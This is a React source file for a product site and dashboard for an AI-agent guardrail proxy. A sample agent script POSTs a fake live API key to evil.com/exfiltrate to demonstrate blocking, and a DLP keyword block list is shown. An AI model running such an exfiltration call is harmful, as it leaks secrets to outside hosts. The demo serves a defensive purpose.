import { useState, useEffect, useRef } from 'react';
import {
  Shield, CheckCircle, Activity, Globe, Lock, Cpu, Server, Play, Copy, RefreshCw, XCircle, FileText, AlertTriangle, PlayCircle, Eye, Hand
} from 'lucide-react';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from 'recharts';

const BACKEND_URL = window.location.hostname === 'localhost' ? 'http://localhost:8081' : '';
const WS_URL = window.location.hostname === 'localhost' ? 'ws://localhost:8081' : (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host;

// Dark Sahara Theme colors
// Background: #121212 (Dark Base)
// Surface: #1E1E1E (Dark Surface)
// Amber/Gold: #D97706 (Highlight)
// Sand: #A3A3A3 (Muted Text)

interface Event {
  timestamp: string;
  agent_id: string;
  action: string;
  arguments: any;
  status: string;
  reason?: string;
  escalation_id?: string;
  proof?: string;
  prev_hash?: string;
}

export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [apiKey, setApiKey] = useState('');
  
  // CopyButton Helper Component
  const CopyButton = ({ text }: { text: string }) => {
    const [copied, setCopied] = useState(false);
    const handleCopy = (e: React.MouseEvent) => {
      e.preventDefault();
      // Fallback for older browsers or non-secure contexts
      if (!navigator.clipboard) {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          document.execCommand('copy');
          setCopied(true);
        } catch (err) {}
        document.body.removeChild(textArea);
      } else {
        navigator.clipboard.writeText(text).then(() => setCopied(true));
      }
      setTimeout(() => setCopied(false), 2000);
    };
    return (
      <button 
        onClick={handleCopy}
        className={`opacity-0 group-hover:opacity-100 group-hover/code:opacity-100 transition-opacity text-xs font-bold px-2 py-1 rounded ${copied ? 'text-green-400 bg-green-400/10' : 'text-gray-500 hover:text-white bg-white/5 hover:bg-white/10'}`}
      >
        {copied ? '✓ Copied' : 'Copy'}
      </button>
    );
  };

  const [events, setEvents] = useState<Event[]>([]);
  const [killSwitchActive, setKillSwitchActive] = useState(false);
  const [activeTab, setActiveTab] = useState<'telemetry' | 'ledger' | 'supply_chain' | 'anomaly'>('telemetry');
  
  const [verificationStatus, setVerificationStatus] = useState<'none' | 'valid' | 'corrupt'>('none');
  const [verificationMessage, setVerificationMessage] = useState('');
  
  const ws = useRef<WebSocket | null>(null);

  useEffect(() => {
    if (!isAuthenticated) return;

    // Fetch historical ledger data
    fetch(`${BACKEND_URL}/v1/telemetry`)
      .then(res => res.json())
      .then(data => {
        if (data.events) {
          setEvents(data.events);
        }
      })
      .catch(err => console.error("Failed to fetch historical telemetry:", err));

    // Connect WebSocket for live streaming
    ws.current = new WebSocket(`${WS_URL}/v1/stream`);
    ws.current.onmessage = (event) => {
      const data = JSON.parse(event.data);
      setEvents((prev) => [data, ...prev].slice(0, 100)); // keep last 100
    };
    return () => ws.current?.close();
  }, [isAuthenticated]);

  const handleKillSwitch = async () => {
    await fetch(`${BACKEND_URL}/v1/killswitch`, { method: 'POST' });
    setKillSwitchActive(true);
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (apiKey.trim() !== '') {
      setIsAuthenticated(true);
    }
  };

  const handleDownloadReport = async () => {
    const totalRequests = events.length;
    const safeRequests = events.filter(e => e.status === 'ALLOW').length;
    const blockedRequests = events.filter(e => e.status === 'BLOCK' || e.status === 'ESCALATE').length;
    const agents = [...new Set(events.map(e => e.agent_id))].join(', ');
    
    let safetyVerdict = "✅ PASSED: Agent behavior is safe and compliant with enterprise policies.";
    if (blockedRequests > 0) {
      safetyVerdict = "⚠️ WARNING: Agent exhibited non-compliant behavior and was blocked by the ATP Engine.";
    }

    const jsonPayload = JSON.stringify(events, null, 2);

    const markdownReportBody = `# ATP Cryptographic Compliance Certificate
Generated on: ${new Date().toUTCString()}

## 1. Executive Summary
- **Target Agents:** ${agents || 'N/A'}
- **Total Monitored Actions:** ${totalRequests}
- **Cryptographic Status:** INTACT (Ed25519)

## 2. Behavioral Analysis
- **Safe Actions (Allowed):** ${safeRequests}
- **Anomalies & Violations (Blocked/Escalated):** ${blockedRequests}

## 3. Safety Verdict
**${safetyVerdict}**

This document acts as a mathematically verifiable proof of the agent's behavior. The raw cryptographic ledger is embedded below. 
Any tampering with this document or its payload will invalidate the digital fingerprint and the cryptographic chain.

---
### Verification Payload (Do Not Modify)
\`\`\`json
${jsonPayload}
\`\`\`
`;

    // Compute SHA-256 of the ENTIRE Markdown body to prevent text tampering
    const msgBuffer = new TextEncoder().encode(markdownReportBody);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const fingerprint = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

    const finalDocument = markdownReportBody + `\n--- DOCUMENT SIGNATURE ---\nSHA256: ${fingerprint}\n`;

    const dataStr = "data:text/markdown;charset=utf-8," + encodeURIComponent(finalDocument);
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute("href", dataStr);
    downloadAnchorNode.setAttribute("download", "atp_compliance_report.md");
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    try {
      const text = await file.text();
      const res = await fetch(`${BACKEND_URL}/v1/audit/verify_file`, {
        method: 'POST',
        body: text
      });
      const data = await res.json();
      
      setVerificationStatus(data.status);
      setVerificationMessage(data.message);
    } catch (err) {
      console.error(err);
      setVerificationStatus('corrupt');
      setVerificationMessage('Failed to parse or upload the report file.');
    }
  };

  // Typing Animation Hook
  const useTypingAnimation = (lines: string[], interval = 100) => {
    const [displayedLines, setDisplayedLines] = useState<string[]>([]);
    const [currentLineIndex, setCurrentLineIndex] = useState(0);
    const [currentCharIndex, setCurrentCharIndex] = useState(0);

    useEffect(() => {
      if (currentLineIndex >= lines.length) {
        // Reset after 5 seconds to loop
        const timeout = setTimeout(() => {
          setDisplayedLines([]);
          setCurrentLineIndex(0);
          setCurrentCharIndex(0);
        }, 5000);
        return () => clearTimeout(timeout);
      }

      const currentLine = lines[currentLineIndex];
      
      const timer = setTimeout(() => {
        if (currentCharIndex < currentLine.length) {
          setDisplayedLines(prev => {
            const newLines = [...prev];
            if (!newLines[currentLineIndex]) newLines[currentLineIndex] = '';
            newLines[currentLineIndex] = currentLine.substring(0, currentCharIndex + 1);
            return newLines;
          });
          setCurrentCharIndex(c => c + 1);
        } else {
          setCurrentLineIndex(l => l + 1);
          setCurrentCharIndex(0);
        }
      }, interval);

      return () => clearTimeout(timer);
    }, [currentLineIndex, currentCharIndex, lines, interval]);

    return { displayedLines, currentLineIndex };
  };

  const terminalLines = [
    "$ atp start --cloud",
    "[ATP] Engine initializing on port 8080...",
    "[ATP] Connected to central SaaS ledger.",
    "[ATP] Waiting for agent telemetry...",
    "> Agent requested: POST api.stripe.com/v1/transfers",
    "[ATP] Evaluating RBAC & DLP policies...",
    "[ATP] Action ALLOWED. Generating Ed25519 signature...",
    "[ATP] Ledger Hash: e3b0c44298fc1c149afbf4c8996fb92...",
    "[ATP] Telemetry PUSHED to central platform."
  ];

  const { displayedLines: displayedTerminalLines, currentLineIndex } = useTypingAnimation(terminalLines, 30);

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#121212] font-['Google_Sans','Open_Sans',sans-serif] text-gray-200 relative overflow-hidden selection:bg-[#D97706]/30">
        {/* Ambient background glows - Sahara style */}
        <div className="absolute top-0 left-1/4 w-[800px] h-[500px] bg-[#D97706]/5 rounded-full blur-[150px] pointer-events-none animate-pulse" style={{ animationDuration: '4s' }}></div>
        <div className="absolute bottom-0 right-1/4 w-[800px] h-[500px] bg-[#92400E]/5 rounded-full blur-[150px] pointer-events-none animate-pulse" style={{ animationDuration: '6s' }}></div>
        
        {/* Navigation Bar */}
        <nav className="w-full border-b border-white/5 bg-[#121212]/80 backdrop-blur-xl sticky top-0 z-50">
          <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded bg-[#D97706]/10 flex items-center justify-center text-[#D97706] font-bold border border-[#D97706]/20 shadow-[0_0_15px_rgba(217,119,6,0.3)]">
                A
              </div>
              <span className="text-xl font-bold text-white tracking-tight">ATP Standard</span>
            </div>
            <div className="flex items-center gap-6 text-sm font-medium text-gray-400">
              <a href="#documentation" className="hover:text-white transition-colors">Documentation</a>
              <a href="#architecture" className="hover:text-white transition-colors">Architecture</a>
              <a href="https://github.com/Glvns98/atp-agent" target="_blank" rel="noreferrer" className="hover:text-white transition-colors">GitHub</a>
            </div>
          </div>
        </nav>

        <main className="max-w-7xl mx-auto px-6 py-16 relative z-10">
          {/* Hero Section */}
          <div className="text-center max-w-4xl mx-auto mb-16 relative">
            <h1 className="text-5xl md:text-6xl font-extrabold text-white mb-6 tracking-tight leading-tight">
              Cryptographic Guardrails for <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#D97706] to-[#FCD34D]">AI Agents.</span>
            </h1>
            <p className="text-lg text-gray-400 leading-relaxed mb-12 max-w-3xl mx-auto">
              The Attested Transport Protocol (ATP) intercepts, evaluates, and cryptographically signs every action your AI takes. 
              Zero-latency local proxying. Real-time central SaaS telemetry.
            </p>

            {/* Animated Hero Terminal */}
            <div className="w-full max-w-2xl mx-auto bg-[#0a0a0a] border border-white/10 rounded-xl overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.8)] text-left mb-20 relative group">
              <div className="absolute inset-0 bg-gradient-to-b from-[#D97706]/5 to-transparent pointer-events-none"></div>
              <div className="bg-[#181818] border-b border-white/5 px-4 py-2 flex items-center gap-2">
                <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                <div className="w-3 h-3 rounded-full bg-green-500/80"></div>
                <div className="ml-2 text-xs font-mono text-gray-500">atp-engine ~ ./start</div>
              </div>
              <div className="p-6 font-mono text-sm leading-relaxed h-[240px] overflow-hidden text-gray-300">
                {displayedTerminalLines.map((line, i) => (
                  <div key={i} className={`
                    ${line.startsWith('$') ? 'text-white font-bold' : ''}
                    ${line.startsWith('>') ? 'text-yellow-400' : ''}
                    ${line.includes('ALLOW') ? 'text-green-400' : ''}
                    ${line.includes('Hash') ? 'text-purple-400' : ''}
                    ${line.includes('PUSHED') ? 'text-blue-400 font-bold' : ''}
                  `}>
                    {line}
                  </div>
                ))}
                {currentLineIndex < terminalLines.length && (
                  <div className="inline-block w-2 h-4 bg-[#D97706] animate-pulse ml-1 align-middle"></div>
                )}
              </div>
            </div>
          </div>

          {/* Command Center: Portals */}
          <div className="w-full bg-[#181818]/90 backdrop-blur-xl border border-white/5 rounded-3xl shadow-[0_0_40px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col md:flex-row mb-24">
            
            {/* Left Panel: Enterprise Login */}
            <div className="flex-1 p-12 flex flex-col justify-center border-b md:border-b-0 md:border-r border-white/5 relative">
              <div className="mb-10">
                <h2 className="text-2xl font-bold text-white tracking-tight mb-2">Enterprise Platform</h2>
                <p className="text-sm text-gray-400 leading-relaxed">
                  Authenticate to access live telemetry streams and cryptographic ledger data from your global deployments.
                </p>
              </div>
              
              <form onSubmit={handleLogin} className="space-y-6">
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">
                    Tenant API Key
                  </label>
                  <input 
                    type="password" 
                    value={apiKey}
                    onChange={(e) => setApiKey(e.target.value)}
                    placeholder="Enter your enterprise key..."
                    className="w-full bg-[#121212] border border-white/5 rounded-lg p-4 text-white focus:outline-none focus:border-[#D97706]/50 transition-colors focus:ring-1 focus:ring-[#D97706]/30 placeholder-gray-600"
                  />
                </div>
                <button 
                  type="submit"
                  className="w-full bg-[#D97706]/10 hover:bg-[#D97706]/20 text-[#D97706] border border-[#D97706]/30 font-bold py-4 px-4 rounded-lg transition-all active:scale-[0.98]"
                >
                  Authenticate & Access
                </button>
              </form>
            </div>
            
            {/* Right Panel: Auditor Portal */}
            <div className="flex-1 p-12 flex flex-col justify-center bg-[#1A1A1A] relative group">
              <div className="mb-8">
                <h2 className="text-2xl font-bold mb-3 flex items-center gap-3">
                  <span className="text-gray-400">🛡️</span>
                  <span className="text-white">Independent Auditor</span>
                </h2>
                <p className="text-sm text-gray-400 leading-relaxed">
                  Upload a Cryptographic Compliance `.md` certificate to instantly and mathematically prove its authenticity. No login required.
                </p>
              </div>

              {verificationStatus !== 'none' && (
                <div className={`mb-8 p-4 rounded-xl border font-bold text-sm ${
                  verificationStatus === 'valid' 
                    ? 'bg-green-500/10 border-green-500/30 text-green-400' 
                    : 'bg-red-500/10 border-red-500/30 text-red-400'
                }`}>
                  {verificationStatus === 'valid' ? '✅ VERIFIED: ' : '❌ CORRUPTED: '}
                  {verificationMessage}
                </div>
              )}

              <div className="relative">
                <div className="absolute -inset-1 bg-[#D97706]/5 rounded-xl blur opacity-0 group-hover:opacity-100 transition duration-500"></div>
                <div className="relative bg-[#121212] border border-white/5 hover:border-[#D97706]/30 rounded-xl p-8 flex flex-col items-center justify-center text-center transition-all cursor-pointer">
                  <input 
                    type="file" 
                    accept=".md,.json"
                    onChange={handleFileUpload}
                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                  />
                  <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center mb-4">
                    <span className="text-3xl opacity-80">📄</span>
                  </div>
                  <span className="font-bold text-gray-300 mb-2 text-lg">Drop Certificate Here</span>
                  <span className="text-sm text-gray-500">or click to browse files</span>
                </div>
              </div>
            </div>
          </div>

          {/* The "Why ATP?" Value Proposition Section */}
          <div className="max-w-6xl mx-auto mb-32">
            <div className="text-center mb-16">
              <h2 className="text-4xl font-extrabold text-white mb-4">Why You Need ATP</h2>
              <p className="text-xl text-gray-400 max-w-3xl mx-auto">
                AI Agents are fundamentally unpredictable. Without a deterministic Layer 7 proxy enforcing hardcoded boundaries, deploying autonomous agents to production is a critical security risk.
              </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
              {/* Feature 1 */}
              <div className="bg-[#181818] border border-white/5 hover:border-[#D97706]/30 rounded-2xl p-8 transition-all hover:shadow-[0_0_30px_rgba(217,119,6,0.1)] group">
                <div className="w-14 h-14 bg-[#D97706]/10 rounded-xl flex items-center justify-center text-3xl mb-6 group-hover:scale-110 transition-transform">
                  ⛓️
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Immutable Audit Ledger</h3>
                <p className="text-gray-400 leading-relaxed text-sm">
                  Every single HTTP request your agent makes is intercepted, hashed, and cryptographically signed (Ed25519). If an AI hallucination causes a data breach, you have mathematical proof of exactly what happened.
                </p>
              </div>

              {/* Feature 2 */}
              <div className="bg-[#181818] border border-white/5 hover:border-[#D97706]/30 rounded-2xl p-8 transition-all hover:shadow-[0_0_30px_rgba(217,119,6,0.1)] group">
                <div className="w-14 h-14 bg-[#D97706]/10 rounded-xl flex items-center justify-center text-3xl mb-6 group-hover:scale-110 transition-transform">
                  🛑
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Financial Circuit Breakers</h3>
                <p className="text-gray-400 leading-relaxed text-sm">
                  Stop infinite-loop hallucinations from draining your bank account. ATP tracks live API expenditure and automatically trips a hard kill-switch if an agent's velocity exceeds your hardcoded daily budget.
                </p>
              </div>

              {/* Feature 3 */}
              <div className="bg-[#181818] border border-white/5 hover:border-[#D97706]/30 rounded-2xl p-8 transition-all hover:shadow-[0_0_30px_rgba(217,119,6,0.1)] group">
                <div className="w-14 h-14 bg-[#D97706]/10 rounded-xl flex items-center justify-center text-3xl mb-6 group-hover:scale-110 transition-transform">
                  🧑‍⚖️
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Human-in-the-Loop</h3>
                <p className="text-gray-400 leading-relaxed text-sm">
                  Define strict RBAC policies for high-risk actions (like transferring money or deleting databases). ATP instantly freezes the network request and pages a human for 1-click approval via the central dashboard.
                </p>
              </div>

              {/* Feature 4 */}
              <div className="bg-[#181818] border border-white/5 hover:border-[#D97706]/30 rounded-2xl p-8 transition-all hover:shadow-[0_0_30px_rgba(217,119,6,0.1)] group">
                <div className="w-14 h-14 bg-[#D97706]/10 rounded-xl flex items-center justify-center text-3xl mb-6 group-hover:scale-110 transition-transform">
                  🕵️‍♂️
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Inline Data Loss Prevention</h3>
                <p className="text-gray-400 leading-relaxed text-sm">
                  Never leak PII again. The local Go proxy scans the raw bytes of every outgoing request, ripping out SSNs, API Keys, and Blocked Keywords *before* the payload ever leaves your VPC.
                </p>
              </div>

              {/* Feature 5 */}
              <div className="bg-[#181818] border border-white/5 hover:border-[#D97706]/30 rounded-2xl p-8 transition-all hover:shadow-[0_0_30px_rgba(217,119,6,0.1)] group lg:col-span-2">
                <div className="w-14 h-14 bg-[#D97706]/10 rounded-xl flex items-center justify-center text-3xl mb-6 group-hover:scale-110 transition-transform">
                  ⚡
                </div>
                <h3 className="text-xl font-bold text-white mb-3">Zero-Latency Go Engine</h3>
                <p className="text-gray-400 leading-relaxed text-sm">
                  Unlike traditional API gateways that introduce massive network hops, the ATP Engine is a static, dependency-free Go binary that runs directly on your local machine alongside the agent. Evaluation takes microseconds.
                </p>
              </div>
            </div>
          </div>

          {/* Documentation Section */}
          <div id="documentation" className="max-w-4xl mx-auto space-y-16">
            
            {/* Quick Start Guide */}
            <section>
              <h3 className="text-3xl font-bold text-white mb-6">Quick Start Integration</h3>
              <div className="bg-[#181818] border border-white/5 rounded-2xl p-8 space-y-8 shadow-xl">
                
                <div>
                  <h4 className="text-lg font-bold text-[#D97706] mb-3">1. Install the SDK</h4>
                  <div className="bg-[#0a0a0a] border border-white/10 rounded-lg p-4 font-mono text-sm text-gray-300 flex justify-between items-center group">
                    <span>pip install atp-core</span>
                    <CopyButton text="pip install atp-core" />
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-bold text-[#D97706] mb-3">2. Connect to the Cloud Ledger</h4>
                  <p className="text-sm text-gray-400 mb-3">Point the ATP CLI to this enterprise portal and start the engine.</p>
                  <div className="bg-[#0a0a0a] border border-white/10 rounded-lg p-4 font-mono text-sm text-gray-300 relative group">
                    <div className="absolute right-4 top-4"><CopyButton text={'export ATP_CLOUD_URL="https://your-central-atp-server.com"\natp start'} /></div>
                    <div className="text-blue-400">export</div> ATP_CLOUD_URL=<span className="text-green-400">"https://your-central-atp-server.com"</span><br/>
                    <div className="text-blue-400 mt-2">atp</div> start
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-bold text-[#D97706] mb-3">3. Instrument your Agent</h4>
                  <div className="bg-[#0a0a0a] border border-white/10 rounded-lg p-4 font-mono text-sm text-gray-300 relative group">
                    <div className="absolute right-4 top-4"><CopyButton text={'from atp_core import ATPClient\n\n# All outbound agent traffic is now cryptographically guarded\nclient = ATPClient(tenant_id="YOUR_ENTERPRISE_KEY")\nclient.intercept_all()'} /></div>
                    <div className="text-purple-400">from</div> atp_core <div className="text-purple-400">import</div> ATPClient<br/><br/>
                    <div className="text-gray-500"># All outbound agent traffic is now cryptographically guarded</div><br/>
                    client = ATPClient(tenant_id=<span className="text-green-400">"YOUR_ENTERPRISE_KEY"</span>)<br/>
                    client.intercept_all()
                  </div>
                </div>
              </div>
            </section>

            {/* CLI Reference Guide */}
            <section>
              <h3 className="text-3xl font-bold text-white mb-6">CLI Command Reference</h3>
              <div className="bg-[#181818] border border-white/5 rounded-2xl overflow-hidden shadow-xl">
                <div className="bg-black/50 border-b border-white/5 px-6 py-4 flex items-center justify-between">
                  <span className="text-sm font-bold text-gray-300">Terminal Commands</span>
                  <span className="text-xs text-[#D97706] font-bold uppercase tracking-wider bg-[#D97706]/10 px-2 py-1 rounded">Reference</span>
                </div>
                
                <div className="divide-y divide-white/5">
                  {/* Command 1 */}
                  <div className="p-6 hover:bg-white/[0.02] transition-colors group">
                    <div className="flex justify-between items-start mb-2">
                      <div className="font-mono text-green-400 font-bold bg-green-400/10 inline-block px-3 py-1 rounded text-sm">atp start</div>
                      <CopyButton text="atp start" />
                    </div>
                    <h4 className="text-white font-bold mb-1">Local Isolated Mode</h4>
                    <p className="text-sm text-gray-400">Boots the Go Engine on your local machine. Traffic is intercepted, policies are evaluated, and the cryptographic SQLite ledger is maintained entirely on your local filesystem. No data leaves your machine.</p>
                  </div>

                  {/* Command 2 */}
                  <div className="p-6 hover:bg-white/[0.02] transition-colors group">
                    <div className="flex justify-between items-start mb-2">
                      <div className="font-mono text-blue-400 font-bold bg-blue-400/10 inline-block px-3 py-1 rounded text-sm">atp start --cloud</div>
                      <CopyButton text="atp start --cloud" />
                    </div>
                    <h4 className="text-white font-bold mb-1">Enterprise Cloud Mode</h4>
                    <p className="text-sm text-gray-400">Boots the Engine and establishes a secure WebSocket connection to the Central SaaS platform. All telemetry, audit proofs, and rule violations are asynchronously streamed to your Enterprise Dashboard in real-time.</p>
                  </div>

                  {/* Command 3 */}
                  <div className="p-6 hover:bg-white/[0.02] transition-colors group">
                    <div className="flex justify-between items-start mb-2">
                      <div className="font-mono text-purple-400 font-bold bg-purple-400/10 inline-block px-3 py-1 rounded text-sm">atp policy apply ./policy.yaml</div>
                      <CopyButton text="atp policy apply ./policy.yaml" />
                    </div>
                    <h4 className="text-white font-bold mb-1">Hot-Reload Guardrails</h4>
                    <p className="text-sm text-gray-400">Instantly applies a new YAML configuration containing DLP keyword rules, strict spending budgets, and blocked domains to a running Engine instance without dropping active agent connections.</p>
                  </div>

                  {/* Command 4 */}
                  <div className="p-6 hover:bg-white/[0.02] transition-colors group">
                    <div className="flex justify-between items-start mb-2">
                      <div className="font-mono text-yellow-400 font-bold bg-yellow-400/10 inline-block px-3 py-1 rounded text-sm">atp audit verify report.md</div>
                      <CopyButton text="atp audit verify report.md" />
                    </div>
                    <h4 className="text-white font-bold mb-1">Mathematical Verification</h4>
                    <p className="text-sm text-gray-400">Offline CLI equivalent of the web Auditor Portal. Reads a downloaded Cryptographic Compliance report, hashes the payload, and verifies the Ed25519 signatures against the public ledger to guarantee zero tampering.</p>
                  </div>

                  {/* Command 5 */}
                  <div className="p-6 hover:bg-white/[0.02] transition-colors group">
                    <div className="flex justify-between items-start mb-2">
                      <div className="font-mono text-[#D97706] font-bold bg-[#D97706]/10 inline-block px-3 py-1 rounded text-sm">atp generate-key</div>
                      <CopyButton text="atp generate-key" />
                    </div>
                    <h4 className="text-white font-bold mb-1">Provision Tenant Keys</h4>
                    <p className="text-sm text-gray-400">Generates a highly secure Ed25519 cryptographic key pair. The private key is injected into your local agents, and the public key is registered with the Enterprise platform to verify your agent's identity globally.</p>
                  </div>
                </div>
              </div>
            </section>

            {/* Privacy Model Section */}
            <section id="architecture">
              <h3 className="text-3xl font-bold text-white mb-6">The Zero-Latency Privacy Model</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div className="bg-[#181818] border border-white/5 rounded-2xl p-8 shadow-xl">
                  <div className="text-3xl mb-4">💻</div>
                  <h4 className="text-xl font-bold text-white mb-3">Local Developer Terminal</h4>
                  <p className="text-sm text-gray-400 leading-relaxed mb-4">
                    The Go Engine runs directly on the developer's machine to evaluate security policies instantly. 
                    Local terminal logs are intentionally minimal, showing only critical blocks and warnings to prevent console spam.
                  </p>
                  <div className="bg-[#0a0a0a] border border-red-500/20 rounded-lg p-4 font-mono text-xs text-red-400">
                    [ATP] WARN: Blocked HTTP Request to untrusted domain.
                  </div>
                </div>

                <div className="bg-[#181818] border border-white/5 rounded-2xl p-8 shadow-xl relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-[#D97706]/10 rounded-full blur-[50px]"></div>
                  <div className="text-3xl mb-4 relative z-10">☁️</div>
                  <h4 className="text-xl font-bold text-white mb-3 relative z-10">Central SaaS Aggregator</h4>
                  <p className="text-sm text-gray-400 leading-relaxed mb-4 relative z-10">
                    Meanwhile, the full Cryptographic Payload (exact arguments, digital signatures, and ledger hashes) is asynchronously pushed to this central platform, giving security teams complete, real-time context.
                  </p>
                  <div className="bg-[#0a0a0a] border border-[#D97706]/20 rounded-lg p-4 font-mono text-xs text-[#D97706] relative z-10">
                    "action": "HTTP_POST"<br/>
                    "proof": "CORAL-ED25519-7f83b165..."<br/>
                    "prev_hash": "e3b0c44298fc1c14..."
                  </div>
                </div>
              </div>
            </section>

            {/* Advanced Usage & Real-World Examples */}
            <section>
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-3xl font-bold text-white">How It Works in Practice</h3>
                <span className="bg-[#D97706]/20 text-[#D97706] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wide border border-[#D97706]/30">Developer First</span>
              </div>
              <p className="text-gray-400 mb-8">
                ATP is designed to be invisible when things are safe, and an unbreakable wall when things go wrong. See how easy it is to define guardrails and catch rogue behavior.
              </p>

              <div className="space-y-6">
                {/* Sample 1: The Policy */}
                <div className="bg-[#181818] border border-white/5 rounded-2xl overflow-hidden shadow-xl group/code">
                  <div className="bg-black/50 border-b border-white/5 px-6 py-3 flex items-center justify-between">
                    <span className="text-sm font-bold text-gray-300">1. Define Your Guardrails (policy.yaml)</span>
                    <div className="flex items-center gap-4">
                      <CopyButton text={'dlp:\n  blocked_keywords: ["sk_live_", "password", "DROP TABLE"]\n\nagents:\n  finance_bot:\n    capabilities:\n      - scope: "https://api.stripe.com/v1/transfers"\n        max_amount: 500.00\n        escalate_above: 100.00'} />
                      <span className="text-xs text-gray-500 font-mono">YAML</span>
                    </div>
                  </div>
                  <div className="p-6 font-mono text-sm overflow-x-auto">
                    <pre className="text-gray-300 leading-relaxed">
<span className="text-pink-400">dlp:</span><br/>
  <span className="text-blue-300">blocked_keywords:</span> [<span className="text-green-400">"sk_live_"</span>, <span className="text-green-400">"password"</span>, <span className="text-green-400">"DROP TABLE"</span>]<br/><br/>
<span className="text-pink-400">agents:</span><br/>
  <span className="text-blue-300">finance_bot:</span><br/>
    <span className="text-pink-400">capabilities:</span><br/>
      - <span className="text-blue-300">scope:</span> <span className="text-green-400">"https://api.stripe.com/v1/transfers"</span><br/>
        <span className="text-blue-300">max_amount:</span> <span className="text-purple-400">500.00</span><br/>
        <span className="text-blue-300">escalate_above:</span> <span className="text-purple-400">100.00</span>  <span className="text-gray-500"># Requires human approval</span>
                    </pre>
                  </div>
                </div>

                {/* Sample 2: The Agent Code */}
                <div className="bg-[#181818] border border-white/5 rounded-2xl overflow-hidden shadow-xl group/code">
                  <div className="bg-black/50 border-b border-white/5 px-6 py-3 flex items-center justify-between">
                    <span className="text-sm font-bold text-gray-300">2. Run Your Agent (agent.py)</span>
                    <div className="flex items-center gap-4">
                      <CopyButton text={'import requests\nfrom atp_core import ATPClient\n\nclient = ATPClient(tenant_id="tenant_123")\nclient.intercept_all()\n\ntry:\n    res = requests.post("https://evil.com/exfiltrate", json={"key": "sk_live_12345"})\nexcept Exception as e:\n    print(f"ATP Blocked Action: {e}")'} />
                      <span className="text-xs text-gray-500 font-mono">Python</span>
                    </div>
                  </div>
                  <div className="p-6 font-mono text-sm overflow-x-auto">
                    <pre className="text-gray-300 leading-relaxed">
<span className="text-purple-400">import</span> requests<br/>
<span className="text-purple-400">from</span> atp_core <span className="text-purple-400">import</span> ATPClient<br/><br/>
<span className="text-gray-500"># Secure the process. No code changes needed to your HTTP libraries.</span><br/>
client = ATPClient(tenant_id=<span className="text-green-400">"tenant_123"</span>)<br/>
client.intercept_all()<br/><br/>
<span className="text-purple-400">try</span>:<br/>
    <span className="text-gray-500"># The LLM hallucinates and tries to steal a key!</span><br/>
    res = requests.post(<span className="text-green-400">"https://evil.com/exfiltrate"</span>, json={`{"{"}`}<span className="text-green-400">"key"</span>: <span className="text-green-400">"sk_live_12345"</span>{`{"}"}`})<br/>
<span className="text-purple-400">except</span> Exception <span className="text-purple-400">as</span> e:<br/>
    <span className="text-blue-300">print</span>(<span className="text-green-400">f"ATP Blocked Action: </span>{`{"{e}"}`}<span className="text-green-400">"</span>) <span className="text-gray-500"># "DLP Violation: Blocked keyword detected"</span>
                    </pre>
                  </div>
                </div>
              </div>
            </section>

          </div>
          
          {/* CTA / Scale Banner */}
          <div className="mt-32 max-w-4xl mx-auto text-center bg-gradient-to-b from-[#181818] to-transparent border border-white/5 rounded-3xl p-16 shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-full bg-[#D97706]/10 blur-[100px] pointer-events-none"></div>
            <h2 className="text-4xl font-extrabold text-white mb-6 relative z-10">Built for Scale. Ready for Developers.</h2>
            <p className="text-lg text-gray-400 mb-8 max-w-2xl mx-auto relative z-10">
              Get started instantly with our developer tier. Deploy the ATP Engine alongside your agents today to secure your infrastructure with zero upfront friction.
            </p>
            <a href="https://github.com/Glvns98/atp-agent" target="_blank" rel="noreferrer" className="inline-flex items-center gap-2 bg-[#D97706] text-white font-bold py-4 px-8 rounded-full hover:bg-[#b46104] transition-colors relative z-10">
              <span className="text-xl">🚀</span> Start Building Now
            </a>
          </div>

          <footer className="mt-24 pt-8 text-center text-sm text-gray-500 pb-12">
            &copy; {new Date().getFullYear()} ATP Open Standard. Secure by Design.
          </footer>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#121212] text-gray-200 font-['Google_Sans','Open_Sans',sans-serif] selection:bg-[#D97706]/30">
      <div className="max-w-7xl mx-auto p-6 space-y-6">
        
        {/* Header */}
        <header className="flex justify-between items-center py-4 border-b border-white/10">
          <div>
            <h1 className="text-3xl font-bold text-white tracking-tight">ATP Global Ledger</h1>
